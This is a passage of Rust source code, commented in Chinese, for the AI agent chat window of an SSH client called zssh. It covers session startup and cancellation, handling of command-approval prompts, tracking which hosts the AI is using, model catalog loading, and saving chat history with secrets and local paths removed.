        Ok(raw) => (ExecMode::from_setting(Some(&raw)), None),
        Err(err) => (ExecMode::Manual, Some(format!("读取执行模式失败：{err}"))),
    }
}

/// 保存执行模式；失败只返回给界面，不 panic。
fn save_exec_mode(db: &Database, mode: ExecMode) -> Result<(), String> {
    db.set_ai_exec_mode(mode_setting(mode))
        .map_err(|err| format!("保存执行模式失败：{err}"))
}

/// 打开 `<数据目录>/zssh.db`（和主机库、AI 智能体窗口同一个库）。
fn open_settings_db() -> Result<Database, String> {
    let dir = crate::settings::data_dir();
    std::fs::create_dir_all(&dir).map_err(|err| format!("创建数据目录失败：{err}"))?;
    Database::open(&dir.join("zssh.db")).map_err(|err| format!("打开设置库失败：{err}"))
}

/// 后台任务 → 界面的消息（100ms tick 取走）。
enum HostEvent {
    /// 会话已经建好，第一条消息也已经发出去（`sent` 是发送结果）。
    Started {
        session: Box<AgentSession>,
        sent: Result<(), String>,
    },
    /// 找安装 / 起进程失败。
    StartFailed(String),
    /// 对话起来之后顺手读回来的模型目录（`agent` 是读的哪个智能体的：用户中途换了就丢掉）。
    Models {
        agent: AgentKind,
        key: Option<String>,
        result: Result<AgentModelCatalog, String>,
    },
    /// 已有会话上发消息的结果。
    Sent(Result<(), String>),
    /// 后台存历史的结果（`id` 是那条历史）；失败是 `HistoryError` 的文字。
    HistorySaved {
        id: String,
        result: Result<(), String>,
    },
}

/// 读主机库里的执行目标；读不到就留空，原因交给底部。
fn load_hosts(db: Option<&Database>) -> (Vec<HostChoice>, Option<String>) {
    let Some(db) = db else {
        return (Vec::new(), None);
    };
    match db.host_list() {
        Ok(hosts) => (
            hosts
                .into_iter()
                .map(|host| HostChoice::plain(host.id, host.name, host.username))
                .collect(),
            None,
        ),
        Err(err) => (Vec::new(), Some(format!("读取主机列表失败：{err}"))),
    }
}

pub struct AgentChatDemo {
    /// 真实模式用的执行模式（读自设置库的 `ai_exec_mode`，和工具桥读的是同一个）。
    mode: ExecMode,
    /// 离线演示用的执行模式：只存在内存里，**不写设置库**（审查 M2：旧版在演示里
    /// 点一下就把真实的审批策略改成了全部放行）。
    demo_mode: ExecMode,
    chat: ChatState,
    /// 设置库；打不开时为 `None`，窗口照常使用。
    db: Option<Database>,
    storage_error: Option<String>,
    /// 读取/保存执行模式的错误；成功保存后清掉。
    settings_error: Option<String>,
    /// 当前是不是真实模式（产品默认）；调试版里可以切到离线演示。
    real: bool,
    /// 主机库里的主机（可选的执行目标）。
    hosts: Vec<HostChoice>,
    /// 用户选中的目标主机 id；默认一台都不选。
    selected_hosts: Vec<i64>,
    /// 这个对话用哪个智能体（0.2.14：每个对话固定一个，中途换 = 新开对话）。默认读设置库的
    /// `ai_default_agent`，面板顶部的下拉可以改。
    agent: AgentKind,
    /// 三种智能体的最新状态（进程级的那一份，每个节拍刷新一次）。
    status: agent_setup::Snapshot,
    /// 已经套用到模型下拉的目录键（智能体 + 路径 + 版本）；换了才重新套用。
    applied_catalog: Option<String>,
    /// 「默认」+ 模型目录。
    models: Vec<ModelChoice>,
    model_index: usize,
    /// 真实会话；第一条消息发出时才建。
    session: Option<AgentSession>,
    /// 正在后台找安装 / 起进程。
    starting: bool,
    /// 这个窗口给安装前检查登记的真实回合；回合进行中是 `Some`，窗口没了随 `Drop` 撤销。
    ai_turn: Option<install_state::Registration>,
    /// 这次启动的取消标记：启动期间点停止 / 新对话就置位，后台任务发第一条消息前会看它。
    start_cancel: Option<Arc<AtomicBool>>,
    /// 这个窗口登记在「AI 使用中」里的主机。
    activity_hosts: Vec<i64>,
    /// 这个对话在 AI 终端登记表里的编号（标签上的活动点按对话各记一份）。
    owner_id: u64,
    /// 「思考中」上次画出来时的已等秒数：秒数变了才重画（节拍里 100 ms 一次，不用每次都画）。
    thinking_sec: Option<u64>,
    /// 起进程期间用户点了「停止」：会话起来之后直接关掉。
    stop_requested: bool,
    /// 起进程期间用户点了「新对话」：会话起来之后直接丢掉。
    discard_start: bool,
    /// 后台结果出口和入口。
    host_tx: Sender<HostEvent>,
    host_rx: Receiver<HostEvent>,
    /// 启动 / 发送失败的底部提示。
    footer_error: Option<String>,
    /// 点链接之后的底部提示（复制了什么网址，或为什么没复制）。
    link_notice: Option<Notice>,
    /// 对话区最多画多少条消息（更早的折叠，点按钮再多画一页）。
    shown_messages: usize,
    /// 历史面板：关着 / 列表 / 查看一条。
    history: HistoryPanel,
    /// 历史列表缓存（打开面板和增删之后刷新）。
    history_rows: Vec<HistorySummary>,
    /// 历史列表 / 查看 / 删除的错误（`HistoryError` 的文字）。
    history_error: Option<String>,
    /// 已点过一次「删除」的历史 id；同一时间只允许一行。
    history_armed: Option<String>,
    /// 查看历史时最多画多少条消息。
    history_shown: usize,
    /// 查看历史时已经选择显示全部输出的消息下标。
    history_full: HashSet<usize>,
    /// 点「继续」后记下的智能体会话 id：下一次懒启动时交给驱动，之后清掉。
    pending_resume: Option<String>,
    /// 这次启动要的是续接：会话起来后没接上（opencode / codex 立刻知道）就提示"上下文没带过去"。
    resume_requested: bool,
    /// 启动失败时要放回输入框的那条消息（0.2.14：启动失败输入框里的字不丢，消息也不进对话）。
    unsent_text: Option<String>,
    /// 失败后等着放回输入框（放回需要窗口，节拍里做）。
    restore_input: Option<String>,
    /// 「已打开历史会话…」的底部提示。
    resume_notice: Option<String>,
    /// 这个对话的历史 id：第一次真实发送时分配，之后的回合写回同一个文件；「新对话」清空，
    /// 「继续」历史会话时换成那条历史的 id。
    history_id: Option<String>,
    /// 存历史的结果：成功是「已保存到历史」，失败是 `HistoryError` 的文字。
    history_save: Option<Notice>,
    /// 正在编辑的排队消息：编号 + 编辑用的输入框（保存或取消后清掉）。
    queue_edit: Option<(u64, Entity<TextareaState>)>,
    /// 输入框现在显示的是不是「回合进行中」的提示（变了才去改占位文字）。
    placeholder_queueing: bool,
    input: Entity<TextareaState>,
    scroll: ScrollHandle,
    focus: FocusHandle,
    /// 嵌在主窗口面板里时才有：目标主机标签、模型 / 强度选择、输入框高度（见 `embed`）。
    embed: Option<embed::Embed>,
    _input_events: Subscription,
    _tick: Task<()>,
}

impl AgentChatDemo {
    pub fn new(window: &mut Window, cx: &mut Context<Self>) -> Self {
        let focus = cx.focus_handle();

        let (db, storage_error) = match open_settings_db() {
            Ok(db) => (Some(db), None),
            Err(err) => (None, Some(err)),
        };
        let (mode, settings_error) = match &db {
            Some(db) => load_exec_mode(db),
            None => (ExecMode::Manual, None),
        };

        let demo_hook = crate::dev_hooks::var(DEMO_ENV);
        let real = start_in_real_mode(demo_hook.as_deref());
        let (hosts, host_error) = load_hosts(db.as_ref());
        let (host_tx, host_rx) = std::sync::mpsc::channel();
        let agent = agent_setup::default_agent(db.as_ref());

        let input = cx.new(|cx| {
            TextareaState::new(window, cx)
                .placeholder(INPUT_PLACEHOLDER)
                .submit_on_enter(true)
                .auto_grow(1, 4)
        });
        let _input_events = cx.subscribe_in(&input, window, |this, _input, event, window, cx| {
            if let InputEvent::PressEnter { shift, .. } = event
                && !*shift
            {
                this.send(window, cx);
            }
        });

        let mut this = Self {
            mode,
            demo_mode: ExecMode::Manual,
            chat: ChatState::default(),
            db,
            storage_error,
            settings_error,
            real,
            hosts,
            selected_hosts: Vec::new(),
            agent,
            status: agent_setup::snapshot(),
            applied_catalog: None,
            models: vec![ModelChoice::default()],
            model_index: 0,
            session: None,
            starting: false,
            ai_turn: None,
            start_cancel: None,
            activity_hosts: Vec::new(),
            owner_id: NEXT_OWNER.fetch_add(1, Ordering::Relaxed),
            thinking_sec: None,
            stop_requested: false,
            discard_start: false,
            host_tx,
            host_rx,
            footer_error: host_error,
            link_notice: None,
            shown_messages: MESSAGES_PER_PAGE,
            history: HistoryPanel::Closed,
            history_rows: Vec::new(),
            history_error: None,
            history_armed: None,
            history_shown: MESSAGES_PER_PAGE,
            history_full: HashSet::new(),
            pending_resume: None,
            resume_requested: false,
            unsent_text: None,
            restore_input: None,
            resume_notice: None,
            history_id: None,
            history_save: None,
            queue_edit: None,
            placeholder_queueing: false,
            input,
            scroll: ScrollHandle::new(),
            focus,
            embed: None,
            _input_events,
            _tick: Task::ready(()),
        };
        this._tick = cx.spawn_in(window, async move |this, cx| {
            loop {
                cx.background_executor().timer(TICK_INTERVAL).await;
                let alive = this.update_in(cx, |this, window, cx| {
                    // 粘到底部：用户往上翻着看旧消息时，新内容不把他拉回底部（面板形态；独立窗口照旧）。
                    let stick = this.embed.is_none() || this.at_bottom();
                    let mut changed = this.sync_agent_state();
                    if let Some(text) = this.restore_input.take() {
                        this.input
                            .update(cx, |state, cx| state.set_value(text, window, cx));
                        changed = true;
                    }
                    if this.poll_host_events(cx) {
                        changed = true;
                    }
                    if this.drain_session() {
                        changed = true;
                    }
                    if this.flush_queue(window, cx) {
                        changed = true;
                    }
                    if this.sync_input_placeholder(window, cx) {
                        changed = true;
                    }
                    if this.flush_queue(window, cx) {
                        changed = true;
                    }
                    if this.chat.advance(this.demo_mode) {
                        changed = true;
                    }
                    if this.thinking_tick() {
                        changed = true;
                    }
                    if changed {
                        if stick {
                            this.scroll.scroll_to_bottom();
                        }
                        cx.notify();
                    }
                });
                if alive.is_err() {
                    break;
                }
            }
        });
        this
    }

    /// 当前智能体现在能不能用。
    fn availability(&self) -> Availability {
        self.status.get(self.agent).availability()
    }

    /// 不能发送的原因（能发返回 `None`）：还在检测、没找到、没登录。版本过低只提示、不拦着。
    fn blocked_reason(&self) -> Option<String> {
        agent_setup::status::blocked_reason(self.agent, self.status.get(self.agent))
    }

    /// 每个节拍：刷新三种智能体的状态；当前智能体可用且目录没取过就在后台取（面板一打开就要
    /// 显示默认模型，不用先发消息），取到了就套用到模型下拉。返回是否有可见变化。
    fn sync_agent_state(&mut self) -> bool {
        let mut changed = false;
        if agent_setup::version() != self.status.version {
            self.status = agent_setup::snapshot();
            changed = true;
        }
        if !self.real {
            return changed;
        }
        let kind = self.agent;
        let status = self.status.get(kind);
        // 0.2.14：没找到 / 版本过低 / 没登录都不去取目录（版本过低的也不启动它）。
        let usable = status.availability() == Availability::Ready;
        let Some(install) = status.found().filter(|_| usable) else {
            return changed;
        };
        let key = agent_setup::catalog::key(kind, install);
        if self.applied_catalog.as_deref() == Some(key.as_str()) {
            return changed;
        }
        match agent_setup::catalog::get(&key) {
            Some(catalog) => {
                self.apply_catalog(&catalog);
                self.applied_catalog = Some(key);
                changed = true;
            }
            None => agent_setup::catalog::ensure(kind, install),
        }
        changed
    }

    /// 把一份模型目录套用到模型 / 强度下拉。
    fn apply_catalog(&mut self, catalog: &AgentModelCatalog) {
        if let Some(embed) = self.embed.as_mut() {
            embed.set_catalog(catalog);
        }
        self.models = model_choices(catalog);
        if self.model_index >= self.models.len() {
            self.model_index = 0;
        }
    }

    /// 独立窗口里的切换按钮：按 opencode → codex → Claude Code 轮着换到下一个可用的。
    fn cycle_agent(&mut self, cx: &mut Context<Self>) {
        let all = AgentKind::ALL;
        let start = self.agent.index();
        for step in 1..=all.len() {
            let candidate = all[(start + step) % all.len()];
            if self
                .status
                .get(candidate)
                .availability()
                .selector_note()
                .is_none()
            {
                self.switch_agent(candidate, cx);
                return;
            }
        }
    }

    /// 切换智能体（0.2.14 `switchAgent`）：每个对话固定一个智能体，已经开始的对话不能中途换，
    /// 换了就开一个新对话；旧智能体的模型目录和选中的模型不带过去。
    fn switch_agent(&mut self, next: AgentKind, cx: &mut Context<Self>) {
        if next == self.agent {
            return;
        }
        // 下拉里不可用的项本来就点不了；兜住脚本和键盘路径。
        if self
            .status
            .get(next)
            .availability()
            .selector_note()
            .is_some()
        {
            return;
        }
        let started = self.session.is_some()
            || self.starting
            || self.pending_resume.is_some()
            || !self.chat.messages.is_empty();
        if started {
            self.new_conversation(cx);
        }
        self.agent = next;
        self.applied_catalog = None;
        self.models = vec![ModelChoice::default()];
        self.model_index = 0;
        if let Some(embed) = self.embed.as_mut() {
            embed.clear_catalog();
        }
        // 历史是按智能体分的：开着的历史面板换成新智能体的。
        if self.history == HistoryPanel::List {
            self.refresh_history();
        } else {
            self.close_history();
        }
        self.link_notice = Some(Notice {
            text: if started {
                format!("已切换到 {}，开始新对话", next.label())
            } else {
                format!("已切换到 {}", next.label())
            },
            error: false,
        });
        self.footer_error = None;
        cx.notify();
    }

    /// 打开窗口时把焦点放到输入框，方便直接输入。
    pub fn input_focus_handle(&self, cx: &App) -> FocusHandle {
        self.input.read(cx).focus_handle(cx)
    }

    /// 当前模式下生效的执行模式。
    fn current_mode(&self) -> ExecMode {
        if self.real { self.mode } else { self.demo_mode }
    }

    /// 选中的目标主机（按主机库顺序），带上「当前」「固定」标记（没写 `target_id` 的调用落在「当前」上）。
    fn selected_targets(&self) -> Vec<HostTarget> {
        let mut targets = selected_targets(&self.hosts, &self.selected_hosts);
        if self.embed.is_some() {
            let flags = self.target_flags();
            for target in &mut targets {
                if let Some((current, pinned)) = flags.get(&target.id) {
                    target.current = *current;
                    target.pinned = *pinned;
                }
            }
            // 锚定在快速连接终端上：目标是那个终端本身，排在最前（它是「当前」）。
            if let Some(terminal) = self.terminal_target() {
                targets.insert(0, terminal);
            }
        }
        targets
    }

    /// 真实回合计数和 `real_running` 对齐：开始、结束、停止、新对话、关窗都走这里。
    /// 登记按窗口各自一条，一个回合只登记一次，迟到的 TurnEnd 不会多减。
    fn sync_ai_turn_count(&mut self) {
        if self.chat.real_running && self.ai_turn.is_none() {
            self.ai_turn = Some(install_state::Registration::started(
                install_state::WorkKind::AiTurn,
            ));
        } else if !self.chat.real_running && self.ai_turn.is_some() {
            self.ai_turn = None;
        }
    }

    /// 真实回合和主机库窗口的「AI 使用中」标记对齐：开始、结束、停止、新对话、
    /// 关窗、增减目标都走这里，和 [`Self::sync_ai_turn_count`] 一起调用。
    ///
    /// 登记的就是 AI 此刻能用的那几台（选中的主机）；回合结束或离线演示时全部撤销。
    fn sync_host_activity(&mut self) {
        let wanted: Vec<i64> = if self.real && self.chat.real_running {
            self.selected_targets()
                .iter()
                .filter(|host| host.terminal.is_none())
                .map(|host| host.id)
                .collect()
        } else {
            Vec::new()
        };
        let current = std::mem::take(&mut self.activity_hosts);
        for id in &current {
            if !wanted.contains(id) {
                host_activity::turn_finished(*id);
            }
        }
        for id in &wanted {
            if !current.contains(id) {
                host_activity::turn_started(*id);
            }
        }
        self.activity_hosts = wanted;
        self.sync_ai_terminals();
    }

    /// AI 此刻正在哪些终端里执行命令（正在跑的 `run_command` 卡片，回报里的终端）：标签上画一个活动点。
    fn sync_ai_terminals(&self) {
        let mut active = HashSet::new();
        if self.real
            && self.chat.real_running
            && let Some(ChatMessage::Assistant(message)) = self.chat.messages.last()
        {
            for card in &message.tools {
                if card.status == ToolStatus::Running
                    && !card.is_approval()
                    && agent_tools::bare_tool_name(&card.tool) == "run_command"
                    && let Some(session) = card.exec.as_ref().and_then(|e| e.session_id.clone())
                {
                    active.insert(session);
                }
            }
        }
        terminals().set_ai_active(self.owner_id, active);
    }

    /// 撤销本窗口的登记；没登记过时什么也不做，重复调用不会清掉别的窗口。
    fn clear_host_activity(&mut self) {
        for host_id in std::mem::take(&mut self.activity_hosts) {
            host_activity::turn_finished(host_id);
        }
        terminals().set_ai_active(self.owner_id, HashSet::new());
    }

    /// 发送输入框里的内容；内容为空时什么也不做。回合进行中（真实模式）改成放进待发送队列：
    /// 驱动在回合里会回 Busy，所以等这一回合结束后再合并发出（见 `queue`）。
    fn send(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if self.chat.is_running() {
            if self.real {
                self.enqueue_input(window, cx);
            }
            return;
        }
        let text = self.input.read(cx).value().to_string();
        if text.trim().is_empty() {
            return;
        }
        // 正在看历史：先回到对话，不然回复落在被面板盖住的消息区里。
        if self.history != HistoryPanel::Closed {
            self.close_history();
        }
        if self.real {
            // 没找到 / 没登录 / 还在检测：输入框本来就是灰的，这里兜住键盘 Enter 的路径。
            if let Some(reason) = self.blocked_reason() {
                self.footer_error = Some(reason);
                cx.notify();
                return;
            }
            // 第一条消息发出时锚定；绑定的主机已经没有打开的终端就不发（V2-U15）。
            if let Some(reason) = self.anchor_gate() {
                self.footer_error = Some(reason);
                cx.notify();
                return;
            }
            self.send_real(text, window, cx);
            return;
        }
        if !self.chat.start_turn(&text) {
            return;
        }
        self.input.update(cx, |state, cx| state.clean(window, cx));
        self.scroll.scroll_to_bottom();
        cx.notify();
    }

    /// 真实模式发送：没有会话就先懒启动。没选主机也能对话（和 0.2.14 一样），只是 AI
    /// 没有任何可执行的目标，底部会一直提示。
    fn send_real(&mut self, text: String, window: &mut Window, cx: &mut Context<Self>) {
        self.send_real_with(text, true, window, cx);
    }

    /// `clear_input`：发的是输入框里的字就清掉；发的是排队消息时输入框里可能正写着新的，不能动。
    fn send_real_with(
        &mut self,
        text: String,
        clear_input: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let targets = self.selected_targets();
        let model = self.selected_model();
        if !self.chat.start_real_turn(&text) {
            return;
        }
        self.sync_ai_turn_count();
        self.sync_host_activity();
        // 第一次发送时给这个对话定一个历史 id：之后的回合都写回同一个文件。
        history_id_for_turn(&mut self.history_id);
        self.history_save = None;
        if clear_input {
            self.input.update(cx, |state, cx| state.clean(window, cx));
        }
        self.footer_error = None;
        self.resume_notice = None;
        self.link_notice = None;
        self.show_anchor_notice();
        self.scroll.scroll_to_bottom();
        cx.notify();

        if let Some(session) = self.session.as_ref() {
            // 用户可能增减过目标：让 scope 和当前选择一致，模型才看得到该看的主机。
            session.sync_hosts(&targets);
            let conversation = Arc::clone(&session.conversation);
            let sender = self.host_tx.clone();
            match runtime() {
                Ok(runtime) => {
                    runtime.spawn(async move {
                        let result = conversation
                            .send(&text, model.as_deref())
                            .await
                            .map_err(|err| err.to_string());
                        let _ = sender.send(HostEvent::Sent(result));
                    });
                }
                Err(err) => self.fail_turn(format!("发送失败：{err}"), cx),
            }
            return;
        }
        self.start_and_send(targets, text, model, cx);
    }

    /// 第一次发送：后台起会话（Claude Code 懒启动进程，opencode / codex 复用或拉起共用进程）、
    /// 加目标，然后发第一条消息。安装信息来自进程级的状态（和面板顶部、设置页看到的同一份）。
    fn start_and_send(
        &mut self,
        targets: Vec<HostTarget>,
        text: String,
        model: Option<String>,
        cx: &mut Context<Self>,
    ) {
        let kind = self.agent;
        // 续接 id 只用在这一次启动上：启动失败也不再留着，免得下次误接。
        let resume_session_id = self.pending_resume.take();
        self.resume_requested = resume_session_id.is_some();
        // 启动失败时要把这条消息放回输入框（0.2.14 同：失败不丢字）。
        self.unsent_text = Some(text.clone());
        let Some(install) = self.status.get(kind).found().cloned() else {
            self.start_failed(format!("没有找到 {}。", kind.label()), cx);
            return;
        };
        let sender = self.host_tx.clone();
        let runtime = match runtime() {
            Ok(runtime) => runtime,
            Err(err) => {
                self.start_failed(format!("启动 {} 失败：{err}", kind.label()), cx);
                return;
            }
        };
        let handle = runtime.handle().clone();
        let models_handle = handle.clone();
        let cancel = Arc::new(AtomicBool::new(false));
        self.start_cancel = Some(Arc::clone(&cancel));
        self.starting = true;
        let catalog_key = agent_setup::catalog::key(kind, &install);
        handle.spawn(async move {
            let session = match start_agent(kind, install, resume_session_id).await {
                Ok(session) => session,
                Err(err) => {
                    let _ = sender.send(HostEvent::StartFailed(err));
                    return;
                }
            };
            session.sync_hosts(&targets);
            // 模型目录慢，单独在后台读，不挡住第一条消息。
            let conversation = Arc::clone(&session.conversation);
            let models_sender = sender.clone();
            models_handle.spawn(async move {
                let result = conversation.models().await.map_err(|err| err.to_string());
                let _ = models_sender.send(HostEvent::Models {
                    agent: kind,
                    key: Some(catalog_key),
                    result,
                });
            });
            // 启动期间点了停止 / 新对话：不把第一条消息发给模型，会话随后由窗口关掉。
            let sent = send_unless_cancelled(
                session.conversation.as_ref(),
                &cancel,
                &text,
                model.as_deref(),
            )
            .await
            .map(|_| ());
            let event = HostEvent::Started {
                session: Box::new(session),
                sent,
            };
            if let Err(rejected) = sender.send(event) {
                // 窗口已经关了，没人接这个会话：在这里正经关掉，别靠 Drop 兜底。
                if let HostEvent::Started { mut session, .. } = rejected.0 {
                    session.shutdown().await;
                }
            }
        });
    }

    /// 启动失败（还没有会话）：这一轮从对话里撤掉、消息放回输入框，原因显示在底部。
    ///
    /// 0.2.14 的做法：`send` 先 `startConversation`，失败就直接返回——输入框里的字还在，用户消息也没
    /// 进对话，只弹原因；原生是懒启动（先画消息再后台起），所以失败时要把这一轮撤回去。
    fn start_failed(&mut self, message: String, cx: &mut Context<Self>) {
        let message = redact_paths(&message);
        self.chat.discard_unstarted_turn();
        self.restore_input = self.unsent_text.take();
        // 启动都失败了：排队的消息不自动再试一遍，留给用户决定。
        self.chat.queue.hold();
        self.resume_requested = false;
        self.footer_error = Some(message);
        self.sync_ai_turn_count();
        self.sync_host_activity();
        self.scroll.scroll_to_bottom();
        cx.notify();
    }

    /// 取后台结果；返回是否有变化。
    fn poll_host_events(&mut self, cx: &mut Context<Self>) -> bool {
        let mut changed = false;
        while let Ok(event) = self.host_rx.try_recv() {
            changed = true;
            match event {
                HostEvent::Started { session, sent } => {
                    self.starting = false;
                    self.start_cancel = None;
                    self.unsent_text = None;
                    if self.discard_start {
                        // 用户已经点了「新对话」：别让回复落在清空后的对话里。
                        self.discard_start = false;
                        self.resume_requested = false;
                        self.shutdown_session(*session, cx);
                    } else if self.stop_requested {
                        self.stop_requested = false;
                        self.resume_requested = false;
                        self.shutdown_session(*session, cx);
                    } else {
                        // 启动期间用户可能又增减了目标：以现在的选择为准。
                        session.sync_hosts(&self.selected_targets());
                        // 要续接、智能体那边的会话已经不在了：和 0.2.14 一样提示"上下文没有带给 AI"。
                        if std::mem::take(&mut self.resume_requested) && !session.resumed {
                            self.chat.apply_agent_event(AgentEvent::ResumeFailed);
                        }
                        self.session = Some(*session);
                        if let Err(err) = sent {
                            self.fail_turn(format!("发送失败：{err}"), cx);
                        }
                    }
                }
                HostEvent::StartFailed(err) => {
                    self.starting = false;
                    self.start_cancel = None;
                    if self.discard_start {
                        // 用户已经点了「新对话」：别把错误写进清空后的对话。
                        self.discard_start = false;
                        self.unsent_text = None;
                        self.resume_requested = false;
                    } else if self.stop_requested {
                        self.stop_requested = false;
                        self.unsent_text = None;
                        self.resume_requested = false;
                    } else {
                        self.start_failed(err, cx);
                    }
                }
                HostEvent::Models { agent, key, result } => match result {
                    Ok(catalog) => {
                        // 对话起来后读回来的目录顺手更新缓存；用户中途换了智能体就只更新缓存。
                        if let Some(key) = key.clone() {
                            agent_setup::catalog::store(key.clone(), catalog.clone());
                            if agent == self.agent {
                                self.applied_catalog = Some(key);
                            }
                        }
                        if agent == self.agent {
                            self.apply_catalog(&catalog);
                        }
                    }
                    Err(err) => {
                        // 新对话 / 停止 / 换智能体之后迟到的错误不再打扰底部。
                        if agent == self.agent && (self.session.is_some() || self.chat.is_running())
                        {
                            self.footer_error = Some(format!(
                                "读取模型列表失败：{err}；仍按「{DEFAULT_MODEL}」发送。"
                            ));
                        }
                    }
                },
                HostEvent::Sent(Ok(())) => {}
                HostEvent::Sent(Err(err)) => {
                    // 已经点了停止 / 新对话：迟到的发送错误不再往对话里写。
                    if self.chat.is_running() {
                        self.fail_turn(format!("发送失败：{err}"), cx);
                    }
                }
                HostEvent::HistorySaved { id, result } => {
                    // 新对话之后迟到的结果不再提示：那个对话的历史 id 已经换掉了。
                    if self.history_id.as_deref() == Some(id.as_str()) {
                        match result {
                            Ok(()) => {
                                self.history_save = Some(Notice {
                                    text: HISTORY_SAVED.to_owned(),
                                    error: false,
                                });
                                // 面板正开着（后台写完时用户点开了历史）：列表要跟着变。
                                if self.history == HistoryPanel::List {
                                    self.refresh_history();
                                }
                            }
                            Err(err) => {
                                self.history_save = Some(Notice {
                                    text: format!("{HISTORY_SAVE_FAILED}{err}"),
                                    error: true,
                                });
                            }
                        }
                    }
                }
            }
        }
        // 启动失败 / 发送失败可能在上面结束了回合，统一在这里对齐计数。
        self.sync_ai_turn_count();
        self.sync_host_activity();
        changed
    }

    /// 把会话里的事件和确认请求取出来；不阻塞界面线程。
    fn drain_session(&mut self) -> bool {
        let Some(session) = self.session.as_mut() else {
            return false;
        };
        let mut changed = false;
        // 只有还在跑的回合收到 TurnEnd 才值得存一次；停止之后迟到的 TurnEnd 不再写。
        let mut turn_ended = false;
        while let Ok(event) = session.events.try_recv() {
            if matches!(&event, AgentEvent::TurnEnd) && self.chat.real_running {
                turn_ended = true;
            }
            self.chat.apply_agent_event(event);
            changed = true;
        }
        while let Some(prompt) = session.next_prompt() {
            if !self.chat.real_running {
                // 回合已经停了 / 结束了（停止之前发起、停止之后才送到的请求）：不弹卡片，
                // 直接按拒绝结束，不能冒出一张可点的"允许"。
                session.resolve_approval(prompt.id, false);
                continue;
            }
            if self.chat.approval_prompt(prompt.id, &prompt.request) {
                changed = true;
            }
        }
        // 执行层回报的实际执行位置：配到卡片上（哪台主机、哪个终端）。对话里有多个目标、或当时没有
        // 「当前」目标时，卡片上要标出主机名。
        let multi = self.selected_hosts.len() > 1
            || self
                .embed
                .as_ref()
                .is_none_or(|embed| !embed.has_current_target());
        while let Some(report) = session.next_report() {
            self.chat.apply_report(report, multi);
            changed = true;
        }
        // 等待期间被超时 / 停止 / 取消选择摘掉的确认：卡片不能一直挂着按钮。
        if self
            .chat
            .expire_dead_approvals(|id| session.tools.approval_is_live(id))
        {
            changed = true;
        }
        if turn_ended {
            self.save_history();
        }
        // TurnEnd 已经把 `real_running` 置 false；这里补一次计数更新。
        self.sync_ai_turn_count();
        self.sync_host_activity();
        changed
    }

    /// 启动 / 发送失败：结束本回合，把原因写进对话和底部。
    fn fail_turn(&mut self, message: String, cx: &mut Context<Self>) {
        // 错误里常带本机路径（找不到 zssh-mcp.exe 等）：显示前统一脱敏。
        let message = redact_paths(&message);
        self.chat.push_notice(message.clone(), true);
        self.chat.finish_real_turn();
        // 发送本身失败：同样不自动重发排队的消息。
        self.chat.queue.hold();
        self.sync_ai_turn_count();
        self.sync_host_activity();
        self.footer_error = Some(message);
        self.scroll.scroll_to_bottom();
        cx.notify();
    }

    /// 把当前对话写进历史：草稿在界面线程拼好，写文件交给后台线程。
    ///
    /// 结果从 `host_rx` 回来（见 [`Self::poll_host_events`]）；写失败只改底部提示，
    /// 不动回合状态。智能体的会话标识和能力密钥都从还活着的会话里取，界面不经手。
    fn save_history(&mut self) {
        if !self.real {
            return;
        }
        let Some(id) = self.history_id.clone() else {
            // 还没发过用户消息：没有可存的东西。
            return;
        };
        let host_label = host_names_label(&self.selected_targets());
        let draft = self
            .chat
            .history_draft(&id, host_label.as_deref(), self.history_anchor());
        // 会话可能还没起来（起进程失败 / 起进程期间点了停止）：没有会话标识和能力密钥，
        // 按只能回看的会话保存，别把这条对话丢了。
        let agent = self
            .session
            .as_ref()
            .map_or(self.agent, |session| session.kind);
        let (session_id, secrets) = match self.session.as_ref() {
            Some(session) => {
                let mut secrets = session.conversation.history_secrets();
                secrets.push(session.capability().to_owned());
                (session.conversation.resume_id(), secrets)
            }
            None => (None, Vec::new()),
        };
        let data_dir = crate::settings::data_dir();
        let sender = self.host_tx.clone();
        let runtime = match runtime() {
            Ok(runtime) => runtime,
            Err(err) => {
                self.history_save = Some(Notice {
                    text: format!("{HISTORY_SAVE_FAILED}{err}"),
                    error: true,
                });
                return;
            }
        };
        runtime.spawn(async move {
            let saved = tokio::task::spawn_blocking(move || {
                // 能力密钥不能进历史文件：交给 core 从正文里抹掉。
                let secrets: Vec<&str> = secrets
                    .iter()
                    .map(String::as_str)
                    .filter(|secret| !secret.is_empty())
                    .collect();
                // 只关心成功与否：没有任何用户消息时 core 返回 `Ok(None)`，也算存过了。
                match HistoryStore::new(&data_dir).save(
                    agent.id(),
                    draft,
                    session_id,
                    &secrets,
                    now_ms(),
                ) {
                    Ok(_) => Ok(()),
                    Err(err) => Err(err.to_string()),
                }
            })
            .await;
            let result = match saved {
                Ok(result) => result,
                Err(err) => Err(format!("后台任务失败：{err}")),
            };
            let _ = sender.send(HostEvent::HistorySaved { id, result });
        });
    }

    /// 关掉一个会话：`shutdown` 在运行时上跑，界面不等待。
    fn shutdown_session(&mut self, session: AgentSession, cx: &mut Context<Self>) {
        // 会话都关了，主机库里的「AI 使用中」标记不能留着。
        self.clear_host_activity();
        let session_label = session.kind.label();
        match runtime() {
            Ok(runtime) => {
                runtime.spawn(async move {
                    let mut session = session;
                    session.shutdown().await;
                });
            }
            Err(err) => {
                // 运行时不可用：至少丢掉句柄（Drop 会停工具桥），进程靠驱动自己收尾。
                drop(session);
                self.footer_error = Some(format!("关闭 {} 会话失败：{err}", session_label));
                cx.notify();
            }
        }
    }

    /// 启动还在后台进行时，让后台任务别再发第一条消息。
    fn cancel_starting(&mut self) {
        if let Some(cancel) = &self.start_cancel {
            cancel.store(true, Ordering::SeqCst);
        }
    }

    /// 结束当前真实会话：关掉已有的，或者让还在后台起的那个起来之后直接丢掉。
    fn end_current_conversation(&mut self, cx: &mut Context<Self>) {
        self.cancel_starting();
        if let Some(session) = self.session.take() {
            self.shutdown_session(session, cx);
        } else if self.starting {
            // 会话还在后台起：起来之后直接丢掉，别在清空的对话里冒出一条回复。
            self.discard_start = true;
        }
        self.stop_requested = false;
    }

    /// 窗口关闭：显式 shutdown 会话（先作废在途工具请求，再杀智能体进程树），
    /// 不靠驱动的 Drop 里同步 `taskkill` 兜底。
    fn teardown(&mut self) {
        self.cancel_starting();
        if let Some(session) = self.session.take() {
            match runtime() {
                Ok(runtime) => {
                    runtime.spawn(async move {
                        let mut session = session;
                        session.shutdown().await;
                    });
                }
                // 运行时不可用（理论上不会）：丢掉句柄，Drop 兜底停监听和 scope。
                Err(err) => {
                    tracing::warn!(error = %err, "窗口关闭时拿不到运行时，会话靠 Drop 收尾")
                }
            }
